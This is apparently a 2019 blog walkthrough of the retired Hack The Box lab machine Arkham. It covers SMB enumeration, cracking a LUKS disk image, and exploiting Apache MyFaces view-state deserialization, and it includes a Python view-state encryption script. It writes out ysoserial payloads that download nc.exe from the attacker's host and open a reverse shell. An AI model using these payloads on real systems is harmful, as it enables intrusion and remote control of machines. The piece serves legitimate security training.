---
layout: post
title: "Arkham: Hack The Box Walkthrough"
date: 2019-08-11 02:22:38 +0000
last_modified_at: 2019-08-12 04:38:04 +0000
category: Walkthrough
tags: ["Hack The Box", Arkham, retired]
comments: true
image:
  feature: arkham-htb-walkthrough.jpg
  credit: sbarbara / Pixabay
  creditlink: https://pixabay.com/photos/former-lunatic-asylum-tuscany-2812589/
---

This post documents the complete walkthrough of Arkham, a retired vulnerable [VM][1] created by [MinatoTW][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

Arkham is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.130 --rate=700

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-21 08:29:45 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.130                                    
Discovered open port 49667/tcp on 10.10.10.130                                 
Discovered open port 8080/tcp on 10.10.10.130                                  
Discovered open port 135/tcp on 10.10.10.130                                   
Discovered open port 445/tcp on 10.10.10.130                                   
Discovered open port 49666/tcp on 10.10.10.130                                 
Discovered open port 139/tcp on 10.10.10.130
```

Well, `masscan` finds a couple of open ports. Let's do one better with `nmap` scanning the discovered ports for services.

```
# nmap -n -v -Pn -p80,135,139,445,8080,49666,49667 -A --reason -oN nmap.txt 10.10.10.130
...
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
8080/tcp  open  http          syn-ack ttl 127 Apache Tomcat 8.5.37
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Mask Inc.
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

Nothing extraordinary.

### SMB Net Shares

And since SMB is available, let's use `smbmap` to see what we can find.

```
# smbmap -H 10.10.10.130 -u guest -R | tee smbmap.txt
[+] Finding open SMB ports....                                                                                                                                              [0/1821]
[+] Guest SMB session established on 10.10.10.130...
[+] IP: 10.10.10.130:445        Name: 10.10.10.130
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        BatShare                                                READ ONLY
        .\
        dr--r--r--                0 Sun Feb  3 13:04:13 2019    .
        dr--r--r--                0 Sun Feb  3 13:04:13 2019    ..
        -r--r--r--          4046695 Sun Feb  3 13:04:13 2019    appserver.zip
        C$                                                      NO ACCESS
```

Hmm. The Bat is sharing something in BatShare. Let's mount the share and copy it to my attacking machine for further analysis.

```
# mount -t cifs -o rw,username=guest,uid=0,gid=0 //10.10.10.130/BatShare bs
```

First, we ascertain that it's indeed a ZIP archive file.

```
# file appserver.zip
appserver.zip: Zip archive data, at least v2.0 to extract
```

Next, we list out what are the files in it.

```
# unzip -l appserver.zip
Archive:  appserver.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      149  2018-12-25 06:21   IMPORTANT.txt
 13631488  2018-12-25 06:05   backup.img
---------                     -------
 13631637                     2 files

```

OK. `IMPORTANT.txt` may really offer important clues.

```
# cat IMPORTANT.txt
Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce
```

I'm sensing a Batman theme here. Next up, check what kind of file is `backup.img`.

```
# file backup.img
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
```

Holy cow! A Linux encrypted disk image.

The fine folks at **hashcat** has enabled LUKS support according to this forum [post](https://hashcat.net/forum/thread-6225.html).

All we have to do is to extract the header and send it to **hashcat** for cracking.

```
# dd if=backup.img of=header.luks bs=512 count=4097
4097+0 records in
4097+0 records out
2097664 bytes (2.1 MB, 2.0 MiB) copied, 0.0553653 s, 37.9 MB/s
```

Because I have a GPU in my windows host machine, I'll be using **hashcat** in Windows for the job.

```
C:\Users\Bernard Lim\Downloads\tools\hashcat-5.1.0> hashcat64 -m 14600 -a 0 -o cracked.txt header.luks rockyou.txt
```

And because it has a Batman theme to it, I'll create a custom wordlist from rockyou.txt.

```
# grep -Ei 'batman|arkham|joker|alfred|bruce' /usr/share/wordlists/rockyou.txt > batman.txt
# wc -l batman.txt
5532 batman.txt
```

5k words is definitely more manageable than 14M!

Time for cracking.

<a class="image-popup">
![862efd25.png](/assets/images/posts/arkham-htb-walkthrough/862efd25.png)
</a>

Boom!

### Mounting a LUKS Image

We need to open the LUKS image with `cryptsetup` like so.

```
# cryptsetup open --type luks backup.img batman
```

It'll prompt you for the password, which is `batmanforever`. Once that's done, we can mount it.

```
# mount /dev/mapper/batman /root/Downloads/arkham/batman
```

It's the backup of the Tomcat instance at `8080/tcp`.

<a class="image-popup">
![b5f8ee81.png](/assets/images/posts/arkham-htb-walkthrough/b5f8ee81.png)
</a>

### Apache MyFaces Serialization Remote Command Execution

From the look of `faces-config.xml`, it appears that Apache MyFaces 1.2 is in use. This is further confirmed by this link on the `http` service at `8080/tcp`.

<a class="image-popup">
![25eb8dd9.png](/assets/images/posts/arkham-htb-walkthrough/25eb8dd9.png)
</a>

Check out the HTML source of `userSubscribe.faces`.

<a class="image-popup">
![31a66dde.png](/assets/images/posts/arkham-htb-walkthrough/31a66dde.png)
</a>

Research into Apache MyFaces 1.2 led me to this [page](http://myfaces.apache.org/shared12/myfaces-shared-core/apidocs/org/apache/myfaces/shared/util/StateUtils.html). The view state above is a base64-encoded, DES encrypted Java serialized object. The important thing about this page is the default values used.

<a class="image-popup">
![9acae796.png](/assets/images/posts/arkham-htb-walkthrough/9acae796.png)
</a>

To the end, I wrote some Python code to test it out.

<div class="filename"><span>crypto.py</span></div>

```python
from Crypto.Cipher import DES
import base64
import hmac
import hashlib

def padding_append(data):
  if len(data) % 8:
    for n in xrange(len(data)):
      if ((len(data) + n) % 8) == 0:
        data += chr(n) * n
        break

  return data

def padding_remove(data):
  data = map(ord, data)
  padv = data[-1]

  if data[-padv:] == [padv,] * padv:
    data = data[:-padv]

  return "".join(map(chr, data))

def decrypt_viewstate(viewstate, secret):
  secret = base64.b64decode(secret)
  des = DES.new(secret, DES.MODE_ECB)

  viewstate = base64.b64decode(viewstate)[:-20]
  viewstate = [viewstate[n:n+8] for n in xrange(0, len(viewstate), 8)]
  viewstate = "".join(map(des.decrypt, viewstate))
  viewstate = padding_remove(viewstate)

  return viewstate

def encrypt_viewstate(viewstate, secret):
  secret = base64.b64decode(secret)
  des = DES.new(secret, DES.MODE_ECB)

  viewstate = padding_append(viewstate)
  viewstate = [viewstate[n:n+8] for n in xrange(0, len(viewstate), 8)]
  viewstate = "".join(map(des.encrypt, viewstate))
  viewstate += hmac.new(secret, viewstate, hashlib.sha1).digest()
  viewstate = base64.b64encode(viewstate)

  return viewstate
```

From `web.xml.bak` we got the secret, which is the same for both DES and HMAC-SHA1.

<a class="image-popup">
![52d81155.png](/assets/images/posts/arkham-htb-walkthrough/52d81155.png)
</a>

Let's give it a shot.

<a class="image-popup">
![128b9cfd.png](/assets/images/posts/arkham-htb-walkthrough/128b9cfd.png)
</a>

It's a serialized Java object indeed!

Now, we can use `ysoserial` to generate a payload and sneak it into the view state.

The Apache MyFaces 1.2 project page lists the Commons Collections framework as one of its dependencies. Let's use it to generate our payload, specifically CommonsCollections6 for commons-collections:3.1.

```
# java -jar ysoserial.jar CommonsCollections6 'powershell Invoke-WebRequest http://10.10.12.32/nc.exe -OutFile nc.exe' > payload
```

The first payload is to copy a `nc.exe` to the current directory or folder, wherever that may be, using PowerShell.

<a class="image-popup">
![38294c3a.png](/assets/images/posts/arkham-htb-walkthrough/38294c3a.png)
</a>

Next, we copy the `base64`-encoded string and put it into the view state parameter for the Tomcat back-end to deserialize it.

<a class="image-popup">
![a6849087.png](/assets/images/posts/arkham-htb-walkthrough/a6849087.png)
</a>

I think we achieved remote command execution! Our next payload will be to run a reverse shell back to us.

```
# java -jar ysoserial.jar CommonsCollections6 'nc.exe 10.10.12.32 1234 -e cmd' > payload
```

Here's the `base64`-encoded payload.

<a class="image-popup">
![fb9a0e79.png](/assets/images/posts/arkham-htb-walkthrough/fb9a0e79.png)
</a>

Let's do the same thing: replace with the original view state with our own.

<a class="image-popup">
![88ba8e22.png](/assets/images/posts/arkham-htb-walkthrough/88ba8e22.png)
</a>

And we have ourselves a low-privilege shell! We can also enter into a PowerShell session.

The `user.txt` is in `Alfred`'s desktop.

<a class="image-popup">
![0e9b0819.png](/assets/images/posts/arkham-htb-walkthrough/0e9b0819.png)
</a>

## Privilege Escalation

During enumeration of `Alfred`'s account, I notice a file `backup.zip` in the Downloads folder. The file contains the Offline Storage Table (OST) of `Alfred`'s email account. I copied the file to the Tomcat webroot to download to my attacking machine for further analysis.

We can use `pffexport` to export the mails, if any.

```
# pffexport -m all alfred@arkham.local.ost
```

There's only one email in the Drafts folder. Here's how it looks like.

<a class="image-popup">
![208b7ec5.png](/assets/images/posts/arkham-htb-walkthrough/208b7ec5.png)
</a>

Armed with `Batman`'s password, we can now log in to his account. `Batman` is an administrator by the way! One more thing, `Batman` is also a member of the Remote Management Users group. As such, I can use PowerShell Remoting to enter into a PowerShell session with his credentials.

<a class="image-popup">
![778649e4.png](/assets/images/posts/arkham-htb-walkthrough/778649e4.png)
</a>

Recall my `nc.exe` is still somewhere in the file system? Let's use it to run another reverse shell back to me, this time as `Batman`.

<a class="image-popup">
![c47ebd00.png](/assets/images/posts/arkham-htb-walkthrough/c47ebd00.png)
</a>

And here's my reverse shell.

<a class="image-popup">
![bc1b3c8b.png](/assets/images/posts/arkham-htb-walkthrough/bc1b3c8b.png)
</a>

With that, getting `root.txt` is trivial.

<a class="image-popup">
![153338c8.png](/assets/images/posts/arkham-htb-walkthrough/153338c8.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/179
[2]: https://www.hackthebox.eu/home/users/profile/8308
[3]: https://www.hackthebox.eu/
